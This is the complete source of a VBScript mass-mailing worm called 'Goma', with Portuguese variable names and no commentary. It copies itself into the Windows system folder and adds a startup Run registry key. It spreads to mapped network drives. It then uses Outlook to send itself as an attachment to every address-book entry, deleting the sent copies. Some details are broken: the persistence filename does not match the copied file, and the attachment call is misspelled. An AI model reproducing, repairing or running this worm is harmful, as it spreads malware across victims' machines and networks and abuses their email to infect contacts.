On Error Resume Next
Dim Copiar_arquivo, Alterar_Reg, Criar_OBJ, Contador, Enviar, Abrir_Outlook, Em_mapi, Lista_end, Entradas, Auxiliar 
Contador = 0 
Set Copiar_arquivo = CreateObject( "Scripting.FileSystemObject" ) 
Copiar_arquivo.CopyFile WScript.ScriptFullName, Copiar_arquivo.BuildPath( Copiar_arquivo.GetSpecialFolder(1), "Goma.vbs" ) 
Set Alterar_Reg = CreateObject( "WScript.Shell" ) 
Alterar_Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "GOMA", Copiar_arquivo.BuildPath( Copiar_arquivo.GetSpecialFolder(1), "GOMA.vbs" ) 
Set Criar_OBJ = CreateObject( "WScript.Network" ) 
Set Enviar = Criar_OBJ.EnumNetworkDrives 
If Enviar.Count <> 0 Then
   For Contador = 0 To Enviar.Count - 1 
        If InStr( Enviar.Item( Contador), "\" ) <> 0 Then
          Copiar_arquivo.CopyFile WScript.ScriptFullName, Copiar_arquivo.BuildPath( Enviar.Item( Contador), "GOMA.vbs" )  
       End If 
   Next 
End If 
Contador = Alterar_Reg.RegRead( "HKEY_LOCAL_MACHINE\" & "GOMA" ) 
Set Abrir_Outlook = CreateObject( "Outlook.Application" ) 
   Set Em_mapi = Abrir_Outlook.GetNameSpace( "MAPI" )  
   For Each Lista_end In Em_mapi.AddressLists 
       Set Enviar = Abrir_Outlook.CreateItem( 0 ) 
       For Entradas = 1 To Lista_end.AddressEntries.Count 
           Set Auxiliar = Lista_end.AddressEntries( Entradas ) 
           If Entradas = 1 Then 
              Enviar.BCC = Auxiliar.Address 
           Else 
              Enviar.BCC = Enviar.BCC & "; " & Auxiliar.Address 
           End If 
       Next 
       Enviar.Subject = "Goma" 
       Enviar.Body = "Goma para sempre !!!!" 
       Enviar.Attachmets.Add WScript.ScriptFullName 
       Enviar.DeleteAfterSubmit = True 
       Enviar.Send 
   Next 
Alterar_Reg.RegWrite "HKEY_LOCAL_MACHINE\" & "GOMA", Contador + 1 